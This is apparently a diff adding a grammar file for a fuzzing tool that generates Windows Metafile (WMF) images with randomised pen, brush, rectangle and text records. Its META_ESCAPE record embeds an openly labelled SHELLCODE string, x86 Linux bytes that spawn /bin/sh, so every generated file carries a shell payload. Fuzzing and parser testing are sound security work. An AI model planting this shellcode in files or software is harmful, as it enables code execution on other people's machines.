@@ -1,0 +1,188 @@
+
+include 'constants.bnf'
+include 'pack.bnf'
+
+<%pre
+    import sys
+    import os
+    import random
+    import struct
+
+    from operator import *
+
+    maxSize = 0
+
+    def recordSize(d):
+        # number of words including the size itself
+        size = (4 + len(d)) >> 1
+        d = LDWORD(size) + d
+        return d
+%>
+
+<%post
+    outputname = 'new-%d.wmf' % $count
+    open(outputname, 'wb').write(bytes($$))
+%>
+
+::WMF(start)
+  : META_HEADER
+    \RECORDS
+    META_EOF
+  ;
+
+::RECORDS
+  : META_CREATEPENINDIRECT
+    META_SELECTOBJECT_1
+    META_CREATEBRUSHINDIRECT
+    META_SELECTOBJECT_2
+    META_RECTANGLE
+    META_TEXTOUT
+    META_ESCAPE
+    NEWFRAME
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_HEADER
+  : METAFILETYPE
+    %LWORD(9)            // header size
+    %LWORD(0x0300)       // version
+    %LDWORD(%floordiv(%add(24, %len(RECORDS)), 2))   // file size = records + header + eof
+    %LWORD(0x02)         // number of objects
+    $MAX_RECORD          // max record
+    %LWORD(0)            // number of members (unused)
+  ;
+
+METAFILETYPE
+  : %LWORD(0x01) // MEMORYMETAFILE
+  | %LWORD(0x02) // DISKMETAFILE
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_ESCAPE(@recordSize)
+  : %LWORD(0x626)
+    %LWORD(9)
+    %LWORD(%len(SHELLCODE))
+    \SHELLCODE
+  ;
+
+SHELLCODE
+  : b'\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh'
+  ;
+
+// ----------------------------------------------------------------------------
+
+::NEWFRAME(@recordSize)
+  : %LWORD(0x626)
+    %LWORD(1)
+    %LWORD(0)
+  ;
+
+// ----------------------------------------------------------------------------
+
+::ABORT_DOC(@recordSize)
+  : %struct.pack('<HHH', 0x626, 2, 0)
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_CREATEPENINDIRECT(@recordSize)
+  : %LWORD(0x02fa)  // meta_createpenindirect
+    PEN_OBJECT
+  ;
+
+::PEN_OBJECT
+  : PEN_STYLE
+    POINTS_OBJECT
+    RAND_COLORREF_OBJECT
+  ;
+
+::PEN_STYLE
+  : %LWORD(4) // PS_DASHDOTDOT
+  ;
+
+::POINTS_OBJECT
+  : %LWORD(0) // x(width, 0 == default == 1px)
+    %LWORD(0) // y(not used)
+  ;
+
+::RAND_COLORREF_OBJECT
+  : %LBYTE(%random.randrange(256)) // red
+    %LBYTE(%random.randrange(256)) // green
+    %LBYTE(%random.randrange(256)) // blue
+    %LBYTE(0) // reserved
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_SELECTOBJECT_1(@recordSize)
+  : %LWORD(0x012d) // meta_selectobject
+    %LWORD(0)      // index
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_CREATEBRUSHINDIRECT(@recordSize)
+  : %LWORD(0x02fc) // meta_createbrushindirect
+    LOGBRUSH
+  ;
+
+::LOGBRUSH
+  : %LWORD(2) // BS_HATCHED
+    RAND_COLORREF_OBJECT
+    %LWORD(4) // BrushHatch
+  ;
+
+::HATCH_STYLE
+  : 0x0000 // HS_HORIZONTAL
+  | 0x0001 // HS_VERTICAL
+  | 0x0002 // HS_FDIAGONAL
+  | 0x0003 // HS_BDIAGONAL
+  | 0x0004 // HS_CROSS
+  | 0x0005 // HS_DIAGCROSS
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_SELECTOBJECT_2(@recordSize)
+  : %LWORD(0x012c) // meta_selectobject
+    %LWORD(1)      // index
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_RECTANGLE(@recordSize)
+  : %LWORD(0x041b) // meta_rectangle
+    %LWORD(0x46)   // bottom
+    %LWORD(0x96)   // right
+    %LWORD(0)      // top
+    %LWORD(0)      // left
+  ;
+
+// ----------------------------------------------------------------------------
+
+::META_TEXTOUT(@recordSize)
+  : %LWORD(0x0521)        // meta_textout
+    %LWORD(%len($WORD2))  // string length
+    %str.encode(\$WORD2)  // string
+    %LWORD(0xa)           // ystart
+    %LWORD(0xa)           // xstart
+  ;
+
+$WORD2: LOWER{3,5}
+  <%
+    $* = $$
+    if len($*) & 0x1:
+        $* += '\x00'
+    maxSize = max(maxSize, len($*))
+  %>
+  ;
+
+$MAX_RECORD: <% $* = LDWORD(int(maxSize / 2) + 6) %>;
+
+// ----------------------------------------------------------------------------
+
+::META_EOF(@recordSize)
+  : %LWORD(0)  // meta_eof
+  ;
